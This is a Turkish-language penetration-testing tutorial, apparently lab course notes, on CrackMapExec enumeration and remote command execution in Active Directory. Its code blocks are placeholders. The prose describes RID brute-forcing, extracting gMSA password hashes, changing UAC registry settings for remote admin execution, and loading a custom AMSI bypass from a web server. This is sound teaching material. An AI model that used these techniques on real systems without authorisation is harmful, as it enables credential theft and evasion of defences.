Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

